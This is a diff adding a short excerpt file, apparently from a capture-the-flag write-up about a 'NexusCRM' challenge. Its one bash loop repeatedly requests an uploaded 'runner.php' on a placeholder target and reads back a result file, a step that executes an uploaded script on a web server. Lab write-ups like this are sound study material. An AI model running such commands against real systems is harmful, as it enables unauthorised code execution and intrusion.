@@ -1,0 +1,5 @@
+# NexusCRM
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Trigger the runner and read its output (bash)
+for i in $(seq 1 25); do curl -s <TARGET>/uploads/runner.php > /dev/null; sleep 0.3; curl -i <TARGET>/uploads/f.txt; done
